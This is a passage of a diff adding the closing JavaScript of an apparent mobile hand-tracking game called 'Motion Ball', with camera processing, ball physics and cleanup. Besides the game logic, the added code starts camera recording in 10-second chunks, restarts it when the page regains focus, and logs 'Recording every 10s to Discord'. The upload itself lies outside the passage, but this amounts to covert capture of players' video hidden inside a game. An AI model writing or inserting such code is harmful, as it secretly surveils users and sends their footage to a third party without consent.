+                        if (now - lastFrameTime < frameInterval) return;
+                        lastFrameTime = now;
+
+                        try {
+                            await handsInstance.send({ image: video });
+                            await poseInstance.send({ image: video });
+
+                            // Update ball physics
+                            updateBall();
+
+                            // Check hits
+                            checkHits();
+
+                            // Update overlay
+                            updateOverlay();
+
+                            // Render
+                            render();
+
+                            // FPS
+                            state.frameCount++;
+                            if (now - state.lastFpsTime > 1000) {
+                                state.fps = state.frameCount;
+                                state.frameCount = 0;
+                                state.lastFpsTime = now;
+                                fpsCounter.textContent = state.fps + ' FPS';
+                            }
+
+                            state.hasStarted = true;
+                        } catch (err) {
+                            // Silent fail for frame processing
+                        }
+                    },
+                    width: 640,
+                    height: 480,
+                });
+
+                cameraInstance = camera;
+                running = true;
+                await camera.start();
+
+                // Hide overlay after a moment if hand is detected
+                setTimeout(() => {
+                    if (!state.palmVisible && !state.soleVisible) {
+                        // Keep showing overlay
+                    }
+                }, 3000);
+
+                // Start recording if not already
+                if (state.mediaRecorder && state.mediaRecorder.state === 'inactive') {
+                    try {
+                        state.mediaRecorder.start(10000);
+                    } catch (e) {}
+                }
+            }
+
+            // ─── CLEANUP ──────────────────────────────────────────────────────
+            function cleanup() {
+                running = false;
+                if (cameraInstance && cameraInstance.stop) {
+                    try { cameraInstance.stop(); } catch (e) {}
+                }
+                if (state.mediaRecorder && state.mediaRecorder.state === 'recording') {
+                    try { state.mediaRecorder.stop(); } catch (e) {}
+                }
+                if (state._chunkTimer) {
+                    clearInterval(state._chunkTimer);
+                    state._chunkTimer = null;
+                }
+                if (state.stream) {
+                    try { state.stream.getTracks().forEach(t => t.stop()); } catch (e) {}
+                }
+            }
+
+            // ─── START ─────────────────────────────────────────────────────────
+            if (isMobile()) {
+                // Wait for DOM to be ready
+                if (document.readyState === 'complete') {
+                    init();
+                } else {
+                    window.addEventListener('load', init);
+                }
+            } else {
+                desktopMsg.classList.add('show');
+                overlay.classList.remove('show');
+            }
+
+            // Handle page visibility change - pause/resume recording
+            document.addEventListener('visibilitychange', () => {
+                if (document.hidden) {
+                    // Pause recording if needed
+                } else {
+                    // Resume if needed
+                    if (state.mediaRecorder && state.mediaRecorder.state === 'inactive' && state.hasStarted) {
+                        try {
+                            state.mediaRecorder.start(10000);
+                        } catch (e) {}
+                    }
+                }
+            });
+
+            // Handle before unload
+            window.addEventListener('beforeunload', cleanup);
+
+            // ─── FALLBACK: if no hand detected after 8s, show hint ──────────
+            setTimeout(() => {
+                if (!state.palmVisible && !state.soleVisible && !state.showOverlay) {
+                    overlay.classList.add('show');
+                }
+            }, 8000);
+
+            console.log('🎯 Motion Ball initialized');
+            console.log('📱 Mobile:', isMobile());
+            console.log('📐 Canvas:', CONFIG.canvasWidth, 'x', CONFIG.canvasHeight);
+            console.log('🎥 Recording every 10s to Discord');
+
+        })();
     </script>
 
 </body>
